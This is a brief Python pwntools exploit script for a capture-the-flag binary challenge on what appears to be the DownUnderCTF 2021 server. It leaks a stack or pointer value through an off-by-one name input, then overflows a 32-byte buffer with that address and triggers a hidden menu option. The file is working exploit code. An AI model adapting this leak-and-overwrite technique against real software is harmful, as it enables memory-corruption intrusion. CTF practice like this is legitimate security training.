# -- coding: utf-8 --
from pwn import *
import subprocess

# ENV
PORT =  31907
HOST = "pwn-2021.duc.tf"
e = context.binary = ELF('./chall')
# lib = ELF('')
lib = e.libc
if len(sys.argv) > 1 and sys.argv[1] == 'r':
    r = remote(HOST, PORT)
else:
    r = e.process()
pause()


# VARIABLE


# PAYLOAD
payload  = ''

r.sendlineafter("our name?", 'a' * (32-1))
r.sendlineafter(">", "2")
r.recvuntil("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
r.recvline()
leak = u64(r.recvline().strip().ljust(8, '\x00'))
leak = leak + 0x7f
log.info("leak :%s:" % hex(leak))
r.sendlineafter(">", '1')
r.sendafter("username to?", 'a' * 32 + p64(leak))
r.sendlineafter('>', "1337")
r.sendlineafter("guess","1179403647")


r.interactive()